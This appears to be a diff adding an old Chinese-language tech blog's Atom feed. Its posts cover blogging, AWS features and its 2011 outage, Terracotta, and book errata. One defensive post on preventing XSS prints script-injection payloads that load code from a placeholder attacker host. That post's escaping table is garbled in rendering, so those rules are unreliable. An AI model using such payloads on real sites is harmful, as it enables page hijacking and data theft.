+<p>像這個: <a href="http://mrjamie.cc/2011/05/19/quit-your-job-get-paid-change-the-world/">如何辭掉你的工作，改變這個世界，還有人付錢給你</a>. 是很難達到的, 而且也不適合每一個人. 但是如果你想除了每個月領薪水, 還能創造出你和別人不一樣的價值的話, 那寫blog是一個很好的開始. (怎麼有點像直銷的語氣?!) 很多人都覺得在台灣engineer不值錢, 而且沒辦法作到老(這是重點, 逼得engineer一定要轉manager或analysis, designer. 薪水高的資深engineer似乎是被砍的高危險群), 其實我認識很多人真的很厲害, 但是沒什麼人知道. 如果他們能利用網路這個媒體, 貢獻他們的知識, 也可以順便提昇自己的價值. 我一直覺得, 會寫程式沒什麼了不起, 快快樂樂學○○這類的書看一下就會寫了. 所以也難怪很多人真的不覺得軟體工程師有什麼價值. 但是了不起的地方在於, 完成一種功能的寫法有無限多種, 哪一種才是最適合的寫法? 這就是為什麼要看高手的code, 看高手的code可以快速增加功力, 一定要思考為什麼他要這樣寫, 如果能舉出這樣寫的利和弊, 以後就可以納為已用. 我看了高手寫的code常常會有, 哦! 原來還有這種寫法, 以前都沒想過. 從另一個角度來看, 你怎麼告訴別人(或客戶), 你設計的架構是比較好的. 同樣的目的, 為什麼要改用你的方法? 舉個例子, CSS每個人都會寫, 但是要render的快, 容易維護, 減少陷阱, 並且在各browser都可以用, 這是很困難的, 但是你能整理出來嗎? 另外, 軟體的東西那麼多, 如果你有用過的經驗, 是不是能很快的作出適合的決定. 例如: 為什麼在這個場合我不要用Hibernate, 在那個地方我要用Spring, 如果你能分析出來, 就是價值所在, 也就是資深工程師厲害的地方. 一但能寫一些有價值的東西, 別人自然就會相信你是這方面的高手, 有機會自然就會找你.
+以前看過一個tweet, 寫的是說: 寫blog的人真是佛心來的啊!  這句話的意思是很感謝blogger能分享他的知識, 但是我想另一方面也代表經營blog真的要花很多心思. 我認為一開始不要很功利的角度去寫, 而是要真正把知識整理好, 如果你寫的好, 不用擔心, 自然就會有更多的正回饋, 自由網路的世界是不會讓你埋沒太久的.</p>
+
+<p>這個星期五(2011-06-17)我在元智大學資訊工程學系有演講, 可以參考這個海報 ;)
+<a href="http://hanklin.com/blog/wp-content/uploads/2011/06/ssv16.jpg"><img src="http://hanklin.com/blog/wp-content/uploads/2011/06/ssv16-740x1024.jpg" alt="" title="ssv16" width="740" height="1024" class="alignnone size-large wp-image-268" /></a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Preventing XSS (I)]]></title>
+    <link href="http://hanklin.com/blog/2011/06/01/preventing-xss-i"/>
+    <updated>2011-06-01T10:18:41+08:00</updated>
+    <id>http://hanklin.com/blog/2011/06/01/preventing-xss-i</id>
+    <content type="html"><![CDATA[<p>作網站要很注意XSS, 和SQL Injection, 可以說是基本中的基本. 這一篇文章是我對如何防止XSS(Cross-Site Scripting)的看法, 但是絕不能認為注意到我提到的地方就可以完全防止了. 攻擊的方法不斷地更新, 網站開發者也要隨時提高警覺, 注意新消息才能避免自己的網站成為下一個受害者.</p>
+
+<h2>基本原理</h2>
+
+
+<p>以現今的網站來說, 幾乎已經沒有完全靜態的網站. 只要有顯示動態資料, 尤其是使用者產生的資料, 就有被XSS的可能. XSS的型態有非常多種, 但主要都是為了要插入一段攻擊者寫的JavaScript, 一但攻擊者能這麼作, 你的網站就能被他利用, 可以作非常多事, 像是偷取網站和其它使用者的資料, 或是讓使用者去安裝殭屍程式. 可以加個<code><iframe></code>, 可以加個<code><script></code>, 基本上就是控制了你的網頁.</p>
+
+<p>看一下例子: 例如在<code><script></code>block裡輸出動態資料:
+<code></p>
+
+<script>
+  var comment = "<?php echo $comment;?>";
+</script>
+
+
+<p></code>
+那攻擊者可以把comment寫成:
+<code>
+";</script><script src="http://ha.ck/"/><script>//
+</code>
+就可以執行任意的JavaScript, 如果是認真的攻擊者, 通常會有3步以上的代理, 利用複雜步驟隱藏真正的意圖, 可能是偷取使用者資訊, 或是安裝trojan horse. 不是在<code><script></code>block裡就沒問題嗎? 唉, 更簡單:
+<code></p>
+
+<p>
+  <?php echo $comment;?>
+</p>
+</code>
+聰明的你, 馬上就知道, 直接不客氣的把comment寫成:
+<code>
+<script src="http://ha.ck/"/>
+</code>
+嘩! hacker練功的好機會!
+
+<h2>心態與作法</h2>
+基本原則就是:
+<p style="font-size:1.4em">絕對不要相信資料來源是無惡意的, 尤其是使用者輸入(或產生)的資料</p>
+所以任何輸出動態html都要作html escaping. 最基本的5大元素: <code>&amp; < > " &#39;</code> 要escape成<code>&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;#39;</code>
+如果是寫動態javascript的字串, 還要注意javascript的escaping, 和html是完全不同的, 要注意的是: <code> / " &#39;</code> 要escape成<code>\ / " &#39;</code>
+
+不過事情總是沒有那麼簡單, 例如: 有時候希望讓使用者打一些有html格式的東西, 如<img>. 就不能單純的一口氣全escape了. 也不能使用regex來拔掉可疑的東西, 因為這不但容易錯, 把正常的markup砍掉, 漏洞又很大, 可以輕易找到避開regex規則的寫法. 有一些作法是在client端先用prototype, jquery等js libraries先處理, 是一個不錯的作法. 另外就是, escape要固定在一個地方, 最好是在顯示之前, 然後其它地方就不要escape了. escape的規則和流程也要固定. 否則就會看到使用者打一個&amp;, 讀寫個幾次就會變成千千萬萬個&amp;&amp;&amp;&#8230;
+
+有一個很常見的情況:
+<code>
+<a onclick=&#39;doSomethingWith("<?php echo $myData?>")&#39;>
+</code>
+
+同時包含了html和javascript, 所以要先escape javascript, 再escape html. 如果反過來的話, single quote和double quote就會少escape一次, (因為變成&amp;開頭了) 就會造成漏洞.
+
+<h2>Reference</h2>
+這篇我整理了好久, 還是寫不完. 不能拖太久, 所以先把完成的貼出來. 也許整個主題寫好之後再來整理比較好. 有興趣的可以先參考以下的連結:
+<ul>
+<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></li>
+<li><a href="http://www.squarefree.com/securitytips/web-developers.html">http://www.squarefree.com/securitytips/web-developers.html</a></li>
+<li><a href="http://wonko.com/post/html-escaping">http://wonko.com/post/html-escaping</a></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Seraph:You seek the Oracle?]]></title>
+    <link href="http://hanklin.com/blog/2011/05/25/seraphyou-seek-the-oracle"/>
+    <updated>2011-05-25T09:37:03+08:00</updated>
+    <id>http://hanklin.com/blog/2011/05/25/seraphyou-seek-the-oracle</id>
+    <content type="html"><![CDATA[<h2>RDS for Oracle Database</h2>
+
+
+<p>好的, 很冷&#8230;只有迷The Matrix的人才懂這個梗. 雖然說NoSQL很紅, 可是即使我們使用了NoSQL在系統裡, 通常還是會需要一個RDBMS. 因為太多libraries, modules, systems都使用了RDBMS, 而且RDBMS也真的好用, 成熟. Google App Engine, AWS等雲端服務提供者都有NoSQL的database, 但是和用習慣的RDBMS比起來, 真的很難用. 即使大廠都在大力的推, 一般公司也不會輕易採用.</p>
+
+<p>在RDBMS界, 除了開源界的MySQL最多網站在使用之外, 公司或大系統最受歡迎的大概就是Oracle了. 我以前使用Oracle的經驗也都是滿愉快的, 容易使用, 功能強大. 如果說有一個雲端Oracle database, 自動幫你維護管理, 你只要使用就好了, 是不是有點夢幻? (database參數和SQL要自己tune咩!) 現在Amazon的RDS就推出了Oracle Database 11g!</p>
+
+<p>我不知道有多少人在期待<a href="http://aws.amazon.com/rds/oracle/">Amazon RDS for Oracle Database</a>, 但是我知道這個一出來, 可以解決一大塊雲端系統上的空白拼圖. 使用Oracle database的系統多了一個選擇, 可以放到Amazon RDS上. 本來就買了license? 沒問題, Amazon一貫的solution就是可以使用你的license. 看一下<a href="http://aws.amazon.com/rds/pricing/">RDS的價錢頁面</a>, 當然使用Oracle會比MySQL貴一些, 但是如果你自己有買license的話, 就可以發現和MySQL的價錢是一樣的. 很合理, 也很方便, 令我很配服Amazon的整合功力.</p>
+
+<p>AWS的下一步呢? 誰知道, AWS的服務已經夠多了, 也許是擴展更多地區(region).</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Thoughts about Terracotta]]></title>
+    <link href="http://hanklin.com/blog/2011/05/24/thought-about-terracotta"/>
+    <updated>2011-05-24T08:10:11+08:00</updated>
+    <id>http://hanklin.com/blog/2011/05/24/thought-about-terracotta</id>
+    <content type="html"><![CDATA[<h2>Software AG acquires Terracotta</h2>
+
+
+<p>好啦, <a href="http://terracotta.org/">Terracotta</a>不像Groupon、Twitter之類的受人囑目, 因為這畢竟是阿宅工程師才知道的東西, 被賣了也沒什麼人注意. 我和Terracotta有關是因為很久以前就看到Terracotta的文章, 看他寫得很神奇, 可以把多個JVM串起來, clustering成一個大JVM一樣. 會開始用也是因為, 在EC2上不支援multicast, 而大部份的session replication或distributed caching機制都依賴multicast, 所以開始使用terracotta作session replication. 效果還滿不錯. 只是還沒有試到很大scale.
+被買走也算是完美出場了, 這些工程師也可以無憂無慮地再作好下一個產品, 真令我羨慕啊! 做出好用、有人用的東西, 才是我們工程師真正應該作的事.</p>
+
+<h2>Terracotta bashed</h2>
+
+
+<p>其實我認為Terracotta的廣告很成功, 甚至有點誇大, 所以生意才作得起來. 但是同時我也覺得, Terracotta並不是一個差勁的產品, 而是一個好的產品. 廣告是誇大了點, 但是至少解決了我的問題. 不過大概從2006年起, 只要terracotta有文章(不論是不是像廣告), 大概都有一堆人來圍勦. 就說你這是舊技術換個名詞而已啦, 或是你的scalability很差之類的. 從theserverside吵到infoq, 例如最近的一篇:  <a href="http://www.infoq.com/news/2010/09/bigmemory">Terracotta&#8217;s BigMemory Aiming to Eliminate Garbage Collection for Java Caches</a> , 就被Gridgain, Gigaspaces圍毆, 連Oracle Coherence都來踹一腳. 沒錯, terracotta一直改產品名字, 換湯不換藥, 我也很不喜歡, 不過他確實work啊, 所以我實在搞不懂他們有什麼恩怨情仇. 也許哪天我試用看看gridgain或gigaspaces產品之後, 就會覺得他們真的比較棒也不一定&#8230;</p>
+
+<p>台灣的工程師真的棒, 我也希望能做出一個大事業, 像terracotta這樣就很好, 作出真正好用的東西, 讓很多人方便地使用.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Errata of AWS Book]]></title>
+    <link href="http://hanklin.com/blog/2011/05/20/errata-aws"/>
+    <updated>2011-05-20T07:56:06+08:00</updated>
+    <id>http://hanklin.com/blog/2011/05/20/errata-aws</id>
+    <content type="html"><![CDATA[<p>有很多圖片, 因為頁數不夠的關係, 沒有印到書上, 造成閱讀的困擾, 真的非常抱歉.
+以下是我發現的問題, 持續更新中&#8230;</p>
+
+<ul>
+<li>Page 18, 最底下的Note. 額外說明:操作成本是以單位機架來算的</li>
+<li>Page 24, L18: (註)的連結在此: <a href="http://open.blogs.nytimes.com/2008/05/21/the-new-york-times-archives-amazon-web-services-timesmachine/">The New York Times Archives + Amazon Web Services = TimesMachine</a> </li>
+<li>Page 32, L15: Newsweek用AWS開元節流 -> Newsweek用AWS開源節流</li>
+<li>Page 51, 倒數L3: 電子郵信 -> 電子郵件 <br/> 2千次封 -> 2千封</li>
+<li>Page 61, L11: 來以來 -> 來以後</li>
+<li>Page 62, L8: 介紹整合開發工具 -> 介紹軟體開發套件(SDK)</li>
+<li>Page 63, L13: C#語為主 -> C#語言為主</li>
+<li>Page 107, L15: 可以得到有「engine」 -> 可以得到有「tag」</li>
+<li>Page 108, L4: 因為「brand」可能有空值 -> 因為「name」可能有空值</li>
+<li>Page 141, L5: 內的任何一點 -> 內的任何一點來回復</li>
+<li>Page 141, L9: 可以用看AWS Management Console的 -> 可以用AWS Management Console看</li>
+<li>Page 150, 表格下Line1: 單位是每GB多少美金 -> 單位是每「機器：小時」多少美金</li>
+<li>Page 173, 倒數L3: 初使化虛擬機器 -> 初始化虛擬機器</li>
+<li>Page 196, L12: 當你把系統裝好之後, 準備開始包成AMI時 -> 當你準備建立全新的AMI時</li>
+<li>Page 218, L16: <code>$ ec2-describe-tags -F "key=env" -F "value=staging"</code></li>
+<li>Page 223, 倒數L7: 適合這個系統作法不一定適合別的作法 -> 適合這個系統的作法不一定適合別的系統</li>
+<li>Page 229, L4: EIP指向新的 -> EIP指向新的虛擬機器</li>
+<li>Page 258, 倒數L5: 系統的資料 -> 系統的資源</li>
+<li>Page 259, L5: 處理資訊傳的細節 -> 處理資訊傳遞的細節</li>
+<li>Page 267, L13: 「當事人」(Permission) -> 「當事人」(Principal) </li>
+<li>Page 319, 倒數L5: 加一行: 例如, 我在這裡選「mystatic」作為來源伺服器</li>
+<li>Page 336, 倒數L4: 拉(poll) -> 拉(pull)</li>
+<li>Page 359, 倒數L1: <code>$ ec2-describe-spot-price-history -d Linux/UNIX -s 2010-10-01T00:00:00 -e 2010-10-30T00:00:00 -H -t m2.4xlarge --region us-east-1</code></li>
+<li>Page 375, L9: 程試 -> 程式</li>
+<li>Page 385, L16: 設定你的鑰匙對-> 並設定你的鑰匙對</li>
+<li>Page 398, L3: 使用VPC需要你的還要由網路管理人員-> 使用VPC需要你提供資訊，還要由網路管理人員</li>
+
+
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Talk at NTU 2011-04-26]]></title>
+    <link href="http://hanklin.com/blog/2011/04/28/talk-at-ntu-2011-04-26"/>
+    <updated>2011-04-28T07:33:17+08:00</updated>
+    <id>http://hanklin.com/blog/2011/04/28/talk-at-ntu-2011-04-26</id>
+    <content type="html"><![CDATA[<p>最近應<a href="http://mikechen.com/">Dr. Chen</a>的邀約, 到台大資工分享我對雲端運算的想法, 照例把slides分享出來.
+最近我越來越覺得, 不能花很多時間在一件事情上, 只為了把它做得更好一點, 更接近完美一點. 不過, 事情總是沒有辦法盡善盡美, 總是有很多意外, 有很多你無法控制的事情突然跑出來, 把你之前的考量都打破, 直接超出控制. 之前我寫的AWS書是這樣, 軟體開發, 設計, 常常也是這樣. 花很多時間構思的設計, 自以為彈性佳, 容易維護和讓人理解. 但是常常很多外在因素一出現, 造成需求的改變或是系統性質的不同, 常常超出原本的構想, 然後又得砍掉重練.
+所以我最近2年來比較喜歡scripting language的原因之一, 要改, 很快, 以簡馭繁, 而且常常能寫得比compiled language還有美感, 真是一門藝術啊. 我也覺得FP比OOP有美感一些, 也更有威力.
+其實我還是比較喜歡Simplicity, 因為我覺得那是一種處理事情的極致的表現. 把所有可以丟掉的東西都去掉之後, 剩下的都是最接觸人心的. 但是我總是先盡量試試有哪些可能性, 然後再試著把比較不重要的地方省略. 也許看的東西, 學的東西多了以後, 我才能夠直接從&#8221;simple&#8221;這端開始出發!</p>
+
+<div style="width:425px" id="__ss_7749267"> <strong style="display:block;margin:12px 0 4px"><a href="http://www.slideshare.net/hanklin/cloud-changes-everything" title="Cloud changes everything">Cloud changes everything</a></strong> <iframe src="http://www.slideshare.net/slideshow/embed_code/7749267" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe> <div style="padding:5px 0 12px"> View more <a href="http://www.slideshare.net/">presentations</a> from <a href="http://www.slideshare.net/hanklin">Hank Lin</a> </div> </div>
+
+
+<p>這張是我的AWS書在博客來的新書排行, 在電腦語言的分類, screen capture下來, 以後才不會看不到, 哈哈! (狀態顯示為心機重&#8230;) 下一個目標是&#8221;暢銷排行榜&#8221;!
+ <img src="http://hanklin.com/blog/wp-content/uploads/2011/04/books-new-rank.png" alt="" title="books-new-rank" width="782" height="564" class="alignnone size-full wp-image-196" /></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Survive AWS Judgment Day]]></title>
+    <link href="http://hanklin.com/blog/2011/04/23/survive-aws-judgement-day"/>
+    <updated>2011-04-23T10:36:33+08:00</updated>
+    <id>http://hanklin.com/blog/2011/04/23/survive-aws-judgement-day</id>
+    <content type="html"><![CDATA[<h2>SkyNet</h2>
+
+
+<p>前幾天還看到很多朋友提醒, 2011-04-21就是<a href="http://en.wikipedia.org/wiki/Skynet_(Terminator)">SkyNet</a>開始發動攻擊的日子了. 這當然是搞笑, 但是沒想到, 真的把AWS打掛了! (沒錯, AWS掛掉的時間是美國2011-04-21) 這次的災情相當慘重, 可以說是一片混亂, 哀鴻遍野. 一直到現在截稿為止, 在美東地區還有一些EBS, EC2, RDS無法連線. 很多新興網站都掛了, 所以將來AWS應該要更小心, 因為除了自己掛掉, 自己也成為更明顯的目標.
+我的news feed上有一大堆AWS的訊息, 可見AWS真是有夠多人在用的. 美國鄉民也發揮了許多創意, 搞笑諷刺都很成功. 有人趕快大讚自己有過人的先見之明, 能全身而退. 有人全力嘲諷, 也有人是不滿AWS掛掉, 但是明白自己的責任也不小.</p>
+
+<h2>挖苦大軍</h2>
+
+
+<p><a href="http://www.awsdowntime.com/">AWS Downtime counter</a>
+提醒你目前AWS的Downtime, 目前還在不斷的流逝中&#8230;
+<img src="http://hanklin.com/blog/wp-content/uploads/2011/04/2011-04-22-00678-300x198.png" alt="aws downtime count" title="aws downtime count" width="300" height="198" class="alignnone size-medium wp-image-174" />
+<a href="http://awsdownti.me/">AWS Downtime</a>
+好啦, awsdowntime.com被註冊了, 就改註冊 .me了! 已經掛很久啦, AWS!
+<img src="http://hanklin.com/blog/wp-content/uploads/2011/04/2011-04-22-00680-300x201.png" alt="" title="aws downtime" width="300" height="201" class="alignnone size-medium wp-image-175" />
+<a href="http://www.ec2disabled.com/">EC2 disabled</a>
+上面列了被AWS影響到的網站, 真的有夠多的, 你也可以回報掛掉的網站. 不知道回報不是AWS架的網站會怎麼樣?
+<img src="http://hanklin.com/blog/wp-content/uploads/2011/04/2011-04-23-00683-300x173.png" alt="" title="ec2 disable" width="300" height="173" class="alignnone size-medium wp-image-176" />
+<a href="https://forums.aws.amazon.com/message.jspa?messageID=238872">SkyNet does not responsible for AWS outage</a>
+有人在forum上面問了, AWS的人也很正經的問答了, 讓我憋著笑好難過啊! 不過這個阿宅梗好像很多人不知道, SkyNet就是魔鬼終結者, 裡面的機器人大軍. 而開始攻擊人類的日子有許多說法, 有一個就是2011-04-21啦!
+還有人說, 其實SkyNet就是EC2! 但是還好, EC2掛了, 不然掛的就是我們人類了.</p>
+
+<h2>封面與內容不符</h2>
+
+
+<p>有幾篇文章, 講得很不錯, 主要就是一個重點, 就是AWS的地區與所在地的說法, 和這次的災情「封面與內容不符」! 原來AWS的所在地(Availability Zone)已經是獨立不受影響的資料中心了, 不應該一起掛掉. 尤其是us-east地區有4個Availability Zones, 應該要很容易可以換到別的Availability Zone繼續服務才對啊(如果你有備份好的話). 所以要嘛不是AWS沒有做好, 不然就是真的太倒霉一起掛掉. 我是看到有人說指定Availability Zone會沒有capacity, 但是不指定的話就能開EC2 instances了. 所以我猜後來大概是capacity不夠的關係.</p>
+
+<ul>
+<li><a href="http://justinsb.posterous.com/aws-down-why-the-sky-is-falling">AWS is down: Why the sky is falling</a></li>
+<li><a href="http://www.geekwire.com/2011/amazoncoms-real-problem-outage-communication">Amazon.com&rsquo;s real problem isn&rsquo;t the outage, it&rsquo;s the communication</a></li>
+</ul>
+
+
+
+
+<h2>如何在AWS審判日存活</h2>
+
+
+<p>好啦, 還是來看一點有建設性的文章. 重點有以下幾點:</p>
+
+<ul>
+<li>EBS snapshot: EBS volumes雖然是persistent, 但是無法跨Availability Zones. 定期對EBS volumes作snapshot還是很有必要, 除了有一個明確的回復點之外, 還可以用snapshot開新的EBS volumes在不同Availability Zones. 能夠較快速回復</li>
+<li>如果把靜態檔案備份到S3上, 可以提高可用性. 比較簡單的服務不容易壞, 可以用S3或再加上CloudFront提供唯讀服務, 或是sorry頁面.</li>
+<li>一台EC2 instance最好不要太多角色, 避免備份, 回復, 以及scale out的困難</li>
+<li>最難搬的資料庫(尤其是RDBMS的話), 還是定期備份到S3一份. 雖然不能讓你馬上回復, 但是可以讓你在別的availability zone甚至region另起爐灶, 先提供read-only的服務(當然你要有作這些開關)</li>
+</ul>
+
+
+<p>
+參考文章:</p>
+
+<ul>
+<li><a href="http://alestic.com/2011/04/ec2-outage">My Experience With the EC2 Judgment Day Outage</a></li>
+<li><a href="http://www.twilio.com/engineering/2011/04/22/why-twilio-wasnt-affected-by-todays-aws-issues/">Why Twilio Wasn&rsquo;t Affected by Today&rsquo;s AWS Issues</a></li>
+<li><a href="http://cloudability.com/single-points-of-failure">Single Points of Failure</a></li>
+<li><a href="http://blog.dotcloud.com/working-around-the-ec2-outage">Working around the EC2 outage</a></li>
+<li><a href="http://webmonkeyuk.wordpress.com/2011/04/21/how-to-work-around-amazon-ec2-outages/">How to work around Amazon EC2 outages</a></li>
+</ul>
+
+
+<p>好啦, 寫太多了, 不要再寫了, 我要準備講稿了. (打哈欠)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[AWS goes down, web sites go down, too]]></title>
+    <link href="http://hanklin.com/blog/2011/04/22/aws-down-web-down"/>
+    <updated>2011-04-22T05:05:27+08:00</updated>
+    <id>http://hanklin.com/blog/2011/04/22/aws-down-web-down</id>
+    <content type="html"><![CDATA[<h2></h2>
+
+
+<p>最近AWS有一些服務都有中斷的情況, 造成很多網站沒有辦法正常工作. 像是許多新興的網站: foursquare, quroa, reddit都無法連線, 想當然很多酸言酸語又出來了, 有的是笑說AWS怎麼會失效, 不是說設計成不會失效嗎? 有的說雲端運算果然還是沒有自有機房來的穩. 看到這些評論我也有些話想說.</p>
+
+<h2>AWS從來沒說它never fail</h2>
+
+
+<p>AWS有SLA的服務, 都有說明它的availability, 可以作為參考. 如果這個服務低於SLA說明的availability, 就會退一個比例的費用, 說明得很清楚. 風險在於, 你沒辦法控制AWS什麼時候失效. 自有機房或是傳統的租用主機就沒有這個風險了嗎? 如果你可以控制機器什麼時候失效, 那就不是風險了.
+如果你有看AWS的<a href="http://status.aws.amazon.com/">health dashboard</a>, 就可以看到us-east地區的EC2以及其它一些服務有問題, 如果你使用這些地區的AWS服務, 就可能會被影響到. 但是如果你看一下其它地區, 如Asia或Europe, 就可以看到所有服務都正常. (和我猜想的一樣) AWS提供多地區的服務, 就是能夠讓你快速的把系統由不同地區的機房來服務. 我知道這個很難作到, 主因是放置資料通常還是只能在一處, 但是cloud computing讓這個作法成為可能.</p>
+
+<h2>How much do you want to pay</h2>
+
+
+<p>&#8220;雲端運算果然還是沒有自有機房來的穩&#8221;, 這句話我同意, 但是我要問一句, 那你準備花多少錢? 除了機器硬體, 水電頻寬房租, 管理員薪水, 所有capacity都要以系統的最大使用量來計算. 如果要異地備援, 簡單的乘以2就好. 別忘了你要求的是高可用性, 所以硬體架構和管理員都要選high-end的. 我相信&#8221;雲端運算果然還是沒有自有機房來的穩&#8221;, 但是一般網站或公司是花不起的.</p>
+
+<h2>quora有情有義</h2>
+
+
+<p>看一下這篇文章: <a href="http://thenextweb.com/industry/2011/04/21/amazon-ec2-troubles-bring-down-reddit-foursquare-quora-hootsuite-and-more/">Amazon EC2 troubles bring down Reddit, Foursquare, Quora, Hootsuite and more</a>, 我不得不說quora真是有情有義啊, quora寫道:
+<quote>
+  We&rsquo;d point fingers, but we wouldn&rsquo;t be where we are today without EC2.
+<quote>
+看! 如果我是Amazon的人, 我看到這句話眼淚都要掉下來了. 這句話包含了千言萬語, 新網站利用EC2快速擴充的能力, 快速壯大, 服務更多使用者. (當然, 掛掉了也有一個對象可以責怪, haha!)</p>
+
+<h2>最近行程</h2>
+
+
+<p>最近在準備一些training和演講, 我是可以都用同一套來講啦, 但是以我龜毛的作事態度, 我都會盡量重新編排內容, 所以會花我很多時間. 希望我可以更有效率的處理準備教材的事, 其實花最多時間的地方是找合適的圖, 因為漂亮的圖大部份都要授權, 所以常常要找好久啊!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Spot EC2 Cluster Instances]]></title>
+    <link href="http://hanklin.com/blog/2011/04/08/spot-ec2-cluster-instances"/>
+    <updated>2011-04-08T19:51:26+08:00</updated>
+    <id>http://hanklin.com/blog/2011/04/08/spot-ec2-cluster-instances</id>
+    <content type="html"><![CDATA[<p>想要偷懶一下都不行, AWS新功能更新的很快, 其實我已經漏了一段時間的AWS新功能沒更新(很明顯, 大概就是之前4個月左右的新功能). 現在要來補完啦!</p>
+
+<h2>EC2 Cluster Instances can be spot instances</h2>
+
+
+<p>EC2提供的<a href="http://aws.amazon.com/hpc-applications/">HPC</a>, 如Cluster Compute 及Cluster GPU現在可以用Spot Instances計費了! 這真的很讚啊, Spot Instances一般比On-Demand便宜50%到60%, 所以想使用Cluster Compute及Cluster GPU, 又被高價嚇到的話, 可以試著結合Spot Instances來省錢! 我之前分享的<a href="http://hanklin.com/blog/p/146">&#8220;Multi-Region Uploading&#8221;</a>, 裡面的&#8221;Async. Worker&#8221;就非常適合使用Spot Instances計費啊! 完全不用怕被EC2關掉導致工作資料流失. 用這個來處理轉檔, 尤其是像CPU intensive的影片檔處理, 用Cluster Compute的instances是最適合的. 可以用很便宜的錢快速的轉好檔案, 是不是有點讓人心動了呢? 讓我也想寫個應用啊&#8230;</p>
+
+<h2>S3 Encryption Client</h2>
+
+
+<p>資料機密性, 是把資料放在服務提供者那邊最大的考量. 最簡單的作法是, 先把資料加密, 再傳到儲存服務上. 要讀取的時候, 下載好再解密, 很麻煩但是安全多了. 現在<a href="http://aws.amazon.com/sdkforjava/">AWS SDK for Java</a> 把這段也幫你作好了, 也就是改用<a href="http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/AmazonS3EncryptionClient.html">AmazonS3EncryptionClient</a>這個class. 支援對稱(symmetric)和非對稱(asymmetric)兩種加密方式, 使用標準Java Cryptography Architecture (JCA)界面, 所以熟Java就可以很快上手. 不熟也沒關係, 看<a href="http://aws.amazon.com/articles/2850096021478074">這篇</a>改一改就可以了. 但是和一般資料機密性的問題一樣, 要安全, 就要帶來一些不便. 例如:</p>
+
+<ul>
+<li>AmazonS3EncryptionClient還不支援S3 Multipart upload</li>
+<li>加密的資訊, 如: symmetric key, <a href="http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/model/EncryptionMaterials.html">EncryptionMaterials</a> 也要和物件一併存起來. 預設是存在這個物件的metadata裡, 所以如果你有寫物件的metadata, 要注意不要超過2KB的限制. 如果有可能超過的話, 就要改用存在另外的物件的方式. (用<a href="http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/model/CryptoStorageMode.html">CryptoStorageMode</a>選擇)</li>
+<li>自己的KeyPair, SecretKey要保管好, 不然自己都解不開</li>
+</ul>
+
+
+<p>加密之後把機密資料放在S3應該可以增加不少信心度, 但是還是回到我常說的, 要加密的資料和不加密的資料一定要分開處理, 可以放不同buckets, 或是用不同object key prefix, 這樣才方便處理.</p>
+
+<p>但是為什麼<a href="http://aws.amazon.com/sdkforjava/">AWS SDK for Java</a>始終都沒有出CloudFront的支援啦, 那個<a href="http://aws.amazon.com/sdkfornet/">AWS SDK for .NET</a>明明都有.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[cloudtw 2011-04]]></title>
+    <link href="http://hanklin.com/blog/2011/04/07/cloudtw-2011-04"/>
+    <updated>2011-04-07T23:37:12+08:00</updated>
+    <id>http://hanklin.com/blog/2011/04/07/cloudtw-2011-04</id>
+    <content type="html"><![CDATA[<p>昨天的CloudTW就在一片歡樂的氣氛中結束了, 大家還欲罷不能, 結束了還一直聊天. 謝謝Jamie熱情贊助場地和披薩飲料, 我走的時還有好多人在熱烈的討論, 讓人覺得未來充滿了希望啊! 讓我不好意思先走啊! 我想當工友來關燈的 ;o
+好啦! 以下就是slides, 本來想放幾張無名正妹在裡面的, 因為大部份內容都是code實在太無聊啦! 還是怕被抗議啦, 不過如果你是正妹, 覺得不介意被我放進slides, 可以告訴我啦! ;O</p>
+
+<div style="width:425px" id="__ss_7543966"> <strong style="display:block;margin:12px 0 4px"><a href="http://www.slideshare.net/hanklin/multi-regionuploading" title="Multi-region uploading">Multi-region uploading</a></strong> <iframe src="http://www.slideshare.net/slideshow/embed_code/7543966" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe> <div style="padding:5px 0 12px"> View more <a href="http://www.slideshare.net/">presentations</a> from <a href="http://www.slideshare.net/hanklin">Hank Lin</a> </div> </div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Amazon新功能: Cloud Drive]]></title>
+    <link href="http://hanklin.com/blog/2011/03/30/amazon-cloud-drive"/>
+    <updated>2011-03-30T21:32:48+08:00</updated>
+    <id>http://hanklin.com/blog/2011/03/30/amazon-cloud-drive</id>
+    <content type="html"><![CDATA[<h2>好康又來了</h2>
+
+
+<p>很久沒有寫Amazon的新功能了，趕快來趕上進度一下，這個<a href="https://www.amazon.com/clouddrive">Cloud Drive</a>又是個好康的東西。所有Amazon使用者都有5GB的免費容量! 可以把在Amazon買的音樂直接放在這裡，然後用<a href="http://www.amazon.com/cloudplayer">Cloud Player</a>播放，還有Android、Mac等播放器，不過這個播放功能目前只有美國才能用。所以在台灣的我們，可以把Cloud Drive當成另一個免費的5GB網路空間啦! Cloud Drive後面當然也是使用Amazon自家的S3，不過Cloud Drive有專門作一個Web UI，比較簡單好用。Cloud Drive也可以昇級，有許多付費等級，20GB一年20美金，而且沒有網路傳輸費，比S3還便宜! AWS新的使用者，S3每個月前5GB是免費的，但剩下的15GB算起來是一年25.2美金(以最便宜的美東地區來計算)。但是S3是無限容量的啦，而且S3可以選「地區」(region)，每個物件又可以獨立用API操作，所以彈性還是比較大啦。不過當然還是希望AWS能再降價，過去降好幾次了，應該會再發生!</p>
+
